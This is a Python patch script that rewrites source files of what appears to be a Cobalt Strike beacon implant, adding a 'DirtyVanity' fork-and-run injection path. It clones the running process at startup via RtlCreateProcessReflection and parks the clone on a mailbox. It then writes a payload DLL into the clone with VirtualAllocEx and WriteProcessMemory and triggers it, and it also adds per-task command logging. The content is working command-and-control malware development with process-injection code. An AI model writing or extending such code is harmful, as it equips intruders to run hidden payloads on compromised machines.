#!/usr/bin/env python3
"""DirtyVanity nursery + task-level trace probes."""
import io

BASE = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src"

# 1) inject_tier2.cpp: replace reflect-trigger + forkrun with the nursery
p = BASE + r"\inject_tier2.cpp"
s = io.open(p, encoding="utf-8").read()

i = s.find("typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION")
j = s.find("BOOL inject_dirtyvanity_forkrun", i)
k = s.find("\n}", s.find("return dv_reflect_fired;", j)) + 2
assert i > 0 and j > i and k > j
new_block = '''typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
	void * ReflectionThreadHandle; /* phnt layout: thread handle first */
	void * UniqueProcess;          /* CLIENT_ID */
	void * UniqueThread;
} T2_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);

/* ---- fork&run nursery ------------------------------------------------
 * A reflection clone of a beacon that has already run HTTP inherits the
 * live wininet/RPC state; the payload beacon inside the clone dies with a
 * fastfail in RPCRT4 on its first checkin (live, twice). Forking instead
 * at beacon() boot - before any RPC-capable subsystem is touched - gives
 * a pristine clone. The clone's initial thread parks on the mailbox (an
 * inherited copy at the identical VA); the spawn path later writes the
 * payload plus mailbox directly into the parked clone and it jumps. No
 * remote threads, no inherited-runtime poisoning, identical image. */
typedef struct {
	volatile LONG go;
	char * entry;
	void * param;
} DV_MAILBOX;

static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
static DWORD dv_clone_pid = 0;

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	((void (*)(void *))dv_mailbox.entry)(dv_mailbox.param);
	for (;;)
		Sleep(60000);
}

void dv_nursery_init(void) {
	fRtlCreateProcessReflection pReflect;
	T2_REFLECTION_INFORMATION info;
	HMODULE nt;
	DWORD pid;

	if (dv_clone_pid != 0)
		return;
	if (!procinj_execute_has(PI_EXEC_DIRTYVANITY))
		return; /* profile does not want fork&run */

	nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return;
	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
	if (pReflect == NULL)
		return;

	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
	ZeroMemory(&info, sizeof(info));
	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
		spawn_log("dv: nursery reflect failed", 0x7fffffff);
		return;
	}

	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
	if (pid == 0 || pid == GetCurrentProcessId()) {
		spawn_log("dv: nursery layout mismatch?", (long)pid);
		return;
	}
	dv_clone_pid = pid;
	spawn_log("dv: nursery up, clone pid=", (long)pid);
}

BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
#if !defined _M_X64
	return FALSE;
#else
	/* deliver the payload into the parked nursery clone: mirror the dll
	 * RX, mirror the parameter RW, flip the mailbox. The trampoline jumps
	 * to the payload entry (offset 0, the spawn convention). Profile
	 * transforms are not applied on this path. One-shot: the clone runs
	 * the payload beacon from here on. */
	void * remote = NULL;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD oldp = 0;
	HANDLE hc;
	DV_MAILBOX mb;

	if (dv_clone_pid == 0)
		return FALSE;

	hc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, dv_clone_pid);
	if (hc == NULL) {
		spawn_log("dv: OpenProcess clone failed gle=", (long)GetLastError());
		return FALSE;
	}

	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
		spawn_log("dv: payload write failed gle=", (long)GetLastError());
		CloseHandle(hc);
		return FALSE;
	}
	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);

	if (plen > 0) {
		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
			spawn_log("dv: param write failed gle=", (long)GetLastError());
			CloseHandle(hc);
			return FALSE;
		}
	}

	mb.go    = 1;
	mb.entry = (char *)remote;
	mb.param = rparam;
	/* dv_mailbox lives in our image - the clone's inherited copy sits at
	 * the identical VA (fork preserves the address space) */
	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
		CloseHandle(hc);
		return FALSE;
	}

	CloseHandle(hc);
	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
	dv_clone_pid = 0; /* one-shot */
	return TRUE;
#endif
}
'''
s = s[:i] + new_block + s[k:]

# drop the now-orphaned dv_reflect_fired static + reflect function references in the chain case
s = s.replace("static BOOL dv_reflect_fired = FALSE;\n\n", "")
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("nursery in")

# remove the chain case in inject.cpp (forkrun no longer drives the pipeline)
p2 = BASE + r"\inject.cpp"
s2 = io.open(p2, encoding="utf-8").read()
old_case = """			/* 4.12 DirtyVanity fork&run trigger: reflect our own process;
			 * the clone inherits this mirrored payload and its initial
			 * thread starts at the entry (see inject_tier2.cpp) */
			case PI_EXEC_DIRTYVANITY:
				if (inject_via_dirtyvanity_reflect(context, (char *)ptr + offset, parameter))
					return TRUE;
				break;

"""
assert s2.count(old_case) == 1
s2 = s2.replace(old_case, "")
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("chain case removed")

# inject.h: swap the prototype for the nursery init
p3 = BASE + r"\inject.h"
s3 = io.open(p3, encoding="utf-8").read()
old_p = "BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter);"
assert s3.count(old_p) == 1
s3 = s3.replace(old_p, "void dv_nursery_init(void);")
io.open(p3, "w", encoding="utf-8", newline="").write(s3)
print("header updated")

# 2) beacon.cpp: nursery init at beacon() entry
p4 = BASE + r"\beacon.cpp"
s4 = io.open(p4, encoding="utf-8").read()
old_b = "void beacon(LPVOID lpReserved) {"
assert s4.count(old_b) == 1
s4 = s4.replace(old_b, '''void beacon(LPVOID lpReserved) {
	/* 4.12 DirtyVanity: fork the pristine nursery clone before ANY
	 * RPC-capable subsystem (wininet et al) is touched - a later fork
	 * inherits poisoned runtime state and the payload beacon fastfails
	 * in RPCRT4 on its first checkin (see inject_tier2.cpp) */
	{
		extern void dv_nursery_init(void); /* self-gates on the profile */
		dv_nursery_init();
	}
''')
io.open(p4, "w", encoding="utf-8", newline="").write(s4)
print("beacon entry hook in")

# 3) proto.cpp: per-task trace
p5 = BASE + r"\proto.cpp"
s5 = io.open(p5, encoding="utf-8").read()
old_t = """		/* process our message */
		//dlog("Process Message: %d t: %d h:%d\\n", h.size, h.type, sizeof(header));
		process_message(h.type, buffer + pos + sizeof(header), h.size);"""
assert s5.count(old_t) == 1
s5 = s5.replace(old_t, """		/* process our message */
		spawn_log("payload: dispatch cmd=", (long)h.type);
		process_message(h.type, buffer + pos + sizeof(header), h.size);"""
)
if '#include "spawn_trace.h"' not in s5:
    s5 = s5.replace('#include "parse.h"', '#include "parse.h"\n#include "spawn_trace.h"', 1)
io.open(p5, "w", encoding="utf-8", newline="").write(s5)
print("task trace in")
